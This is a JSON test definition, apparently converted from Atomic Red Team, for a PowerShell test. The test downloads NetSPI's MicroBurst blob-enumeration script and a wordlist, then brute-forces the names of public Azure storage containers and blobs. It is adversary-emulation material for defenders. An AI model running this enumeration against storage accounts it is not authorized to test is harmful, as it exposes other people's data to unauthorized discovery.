{
  "id": "3dab4bcc-667f-4459-aea7-4162dd2d6590",
  "name": "Azure - Enumerate Azure Blobs with MicroBurst",
  "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
  "platforms": [
    "iaas:azure"
  ],
  "steps": [
    {
      "id": "b3525e7f-f78d-44b3-a801-ca75ef779d22",
      "type": "execute-command",
      "data": {
        "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base #{base} -permutations \"#{wordlist}\" -outputfile \"#{output_file}\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "76aba413-7730-403a-b006-d21495692cb9",
      "type": "execute-command",
      "data": {
        "command": "remove-item #{output_file} -erroraction silentlycontinue\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "312e4e47-aeb2-4569-8701-31cee36dcc8a",
      "name": "Check dependency 1/2",
      "description": "The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "50e419a8-149f-41b7-92c6-a97e9bcbedfc",
      "name": "Resolve dependency 1/2",
      "description": "The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "455971ba-959e-407e-8b23-0cce9d12d003",
      "name": "Re-check dependency 1/2",
      "description": "The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "04d02b7e-436d-4f0b-a216-f9b4c19f4774",
      "name": "Check dependency 2/2",
      "description": "The wordlist file for search permutations must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"#{wordlist}\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1a606c0a-24d5-4bd4-b9ac-36ddae41e45f",
      "name": "Resolve dependency 2/2",
      "description": "The wordlist file for search permutations must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "invoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt\" -outfile \"#{wordlist}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c23d4fc1-6ab3-4702-aa13-bf4adac47217",
      "name": "Re-check dependency 2/2",
      "description": "The wordlist file for search permutations must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"#{wordlist}\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "b3525e7f-f78d-44b3-a801-ca75ef779d22",
      "p": "on-success",
      "o": "76aba413-7730-403a-b006-d21495692cb9"
    },
    {
      "s": "b3525e7f-f78d-44b3-a801-ca75ef779d22",
      "p": "on-failure",
      "o": "76aba413-7730-403a-b006-d21495692cb9"
    },
    {
      "s": "312e4e47-aeb2-4569-8701-31cee36dcc8a",
      "p": "on-success",
      "o": "b3525e7f-f78d-44b3-a801-ca75ef779d22"
    },
    {
      "s": "312e4e47-aeb2-4569-8701-31cee36dcc8a",
      "p": "on-failure",
      "o": "50e419a8-149f-41b7-92c6-a97e9bcbedfc"
    },
    {
      "s": "50e419a8-149f-41b7-92c6-a97e9bcbedfc",
      "p": "on-success",
      "o": "455971ba-959e-407e-8b23-0cce9d12d003"
    },
    {
      "s": "455971ba-959e-407e-8b23-0cce9d12d003",
      "p": "on-failure",
      "o": "b3525e7f-f78d-44b3-a801-ca75ef779d22"
    },
    {
      "s": "04d02b7e-436d-4f0b-a216-f9b4c19f4774",
      "p": "on-success",
      "o": "b3525e7f-f78d-44b3-a801-ca75ef779d22"
    },
    {
      "s": "04d02b7e-436d-4f0b-a216-f9b4c19f4774",
      "p": "on-failure",
      "o": "1a606c0a-24d5-4bd4-b9ac-36ddae41e45f"
    },
    {
      "s": "1a606c0a-24d5-4bd4-b9ac-36ddae41e45f",
      "p": "on-success",
      "o": "c23d4fc1-6ab3-4702-aa13-bf4adac47217"
    },
    {
      "s": "c23d4fc1-6ab3-4702-aa13-bf4adac47217",
      "p": "on-failure",
      "o": "b3525e7f-f78d-44b3-a801-ca75ef779d22"
    }
  ],
  "tags": [
    "T1530",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "base",
      "type": "string",
      "description": "Azure blob keyword to enumerate (Example, storage account name)",
      "value": "secure"
    },
    {
      "name": "output_file",
      "type": "string",
      "description": "File to output results to",
      "value": "$env:temp\\T1530Test1.txt"
    },
    {
      "name": "wordlist",
      "type": "string",
      "description": "File path to keywords for search permutations",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt"
    }
  ]
}